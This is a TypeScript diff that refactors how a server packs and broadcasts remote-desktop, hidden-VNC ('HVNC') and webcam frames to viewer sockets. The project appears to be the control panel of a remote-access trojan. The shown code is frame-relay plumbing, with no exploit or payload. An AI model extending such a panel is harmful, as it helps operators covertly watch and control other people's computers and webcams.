@@ -64,26 +64,7 @@ function safeSendViewer(ws: ServerWebSocket<SocketData>, payload: unknown) {
 
 function safeSendViewerFrame(ws: ServerWebSocket<SocketData>, bytes: Uint8Array, header?: any): number {
   try {
-    const meta = new Uint8Array(8);
-    meta[0] = 0x46;
-    meta[1] = 0x52;
-    meta[2] = 0x4d;
-    meta[3] = 1;
-    meta[4] = (header?.monitor ?? 0) & 0xff;
-    meta[5] = (header?.fps ?? 0) & 0xff;
-    const fmt = header?.format === "blocks"
-      ? 2
-      : header?.format === "blocks_raw"
-      ? 3
-      : header?.format === "h264"
-      ? 4
-      : 1;
-    meta[6] = fmt;
-    meta[7] = 0;
-
-    const buf = new Uint8Array(meta.length + bytes.length);
-    buf.set(meta, 0);
-    buf.set(bytes, meta.length);
+    const buf = buildViewerFrameBuffer(bytes, header);
     ws.send(buf);
     metrics.recordBytesSent(buf.length);
     return buf.length;
@@ -91,6 +72,57 @@ function safeSendViewerFrame(ws: ServerWebSocket<SocketData>, bytes: Uint8Array,
     logger.error("[rd] viewer frame send failed", err);
     return 0;
   }
+}
+
+function buildViewerFrameBuffer(bytes: Uint8Array, header?: any): Uint8Array {
+  const meta = new Uint8Array(8);
+  meta[0] = 0x46;
+  meta[1] = 0x52;
+  meta[2] = 0x4d;
+  meta[3] = 1;
+  meta[4] = (header?.monitor ?? 0) & 0xff;
+  meta[5] = (header?.fps ?? 0) & 0xff;
+  const fmt = header?.format === "blocks"
+    ? 2
+    : header?.format === "blocks_raw"
+    ? 3
+    : header?.format === "h264"
+    ? 4
+    : 1;
+  meta[6] = fmt;
+  meta[7] = 0;
+
+  const buf = new Uint8Array(8 + bytes.length);
+  buf.set(meta, 0);
+  buf.set(bytes, 8);
+  return buf;
+}
+
+function broadcastFrameToViewers(
+  sessions: Iterable<{ viewer: ServerWebSocket<SocketData> }>,
+  buf: Uint8Array,
+  header?: any,
+): boolean {
+  let sent = false;
+  const t0 = performance.now();
+  const byteLen = buf.length;
+  for (const session of sessions) {
+    try {
+      session.viewer.send(buf);
+      metrics.recordBytesSent(byteLen);
+      sent = true;
+    } catch (err) {
+      logger.error("[rd] viewer frame send failed", err);
+    }
+  }
+  const elapsed = performance.now() - t0;
+  if (sent) {
+    rdSendStats.frames += 1;
+    rdSendStats.bytes += byteLen;
+    rdSendStats.sendMs += elapsed;
+  }
+  logRdSend(header);
+  return sent;
 }
 
 const rdSendStats = { lastLog: 0, frames: 0, sendMs: 0, bytes: 0 };
@@ -379,34 +411,17 @@ function handleRemoteDesktopFrame(payload: any) {
   const clientId = payload.clientId as string;
   const header = payload.header;
   const bytes = payload.data as Uint8Array;
-  const t0 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
   const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false };
   if (!state.isStreaming) {
     rdStreamingState.set(clientId, { ...state, isStreaming: true });
   }
-  for (const session of sessionManager.getRdSessionsForClient(clientId)) {
-    const sentBytes = safeSendViewerFrame(session.viewer, bytes, header);
-    const t1 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
-    rdSendStats.frames += 1;
-    rdSendStats.bytes += sentBytes;
-    rdSendStats.sendMs += t1 - t0;
-  }
-  logRdSend(header);
+  const buf = buildViewerFrameBuffer(bytes, header);
+  broadcastFrameToViewers(sessionManager.getRdSessionsForClient(clientId), buf, header);
 }
 
 (globalThis as any).__rdBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
-  let sent = false;
-  const t0 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
-  for (const session of sessionManager.getRdSessionsForClient(clientId)) {
-    const sentBytes = safeSendViewerFrame(session.viewer, bytes, header);
-    const t1 = typeof performance !== "undefined" && performance.now ? performance.now() : Date.now();
-    rdSendStats.frames += 1;
-    rdSendStats.bytes += sentBytes;
-    rdSendStats.sendMs += t1 - t0;
-    sent = true;
-  }
-  logRdSend(header);
-  return sent;
+  const buf = buildViewerFrameBuffer(bytes, header);
+  return broadcastFrameToViewers(sessionManager.getRdSessionsForClient(clientId), buf, header);
 };
 
 export const hvncStreamingState = new Map<string, { isStreaming: boolean; display: number; quality: number; codec: string }>();
@@ -674,21 +689,13 @@ export function sendHVNCCommand(target: ClientInfo, commandType: string, payload
 }
 
 (globalThis as any).__hvncBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
-  let sent = false;
-  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
-    safeSendViewerFrame(session.viewer, bytes, header);
-    sent = true;
-  }
-  return sent;
+  const buf = buildViewerFrameBuffer(bytes, header);
+  return broadcastFrameToViewers(sessionManager.getHvncSessionsForClient(clientId), buf, header);
 };
 
 (globalThis as any).__webcamBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
-  let sent = false;
-  for (const session of sessionManager.getWebcamSessionsForClient(clientId)) {
-    safeSendViewerFrame(session.viewer, bytes, header);
-    sent = true;
-  }
-  return sent;
+  const buf = buildViewerFrameBuffer(bytes, header);
+  return broadcastFrameToViewers(sessionManager.getWebcamSessionsForClient(clientId), buf, header);
 };
 
 const textDecoder = new TextDecoder();
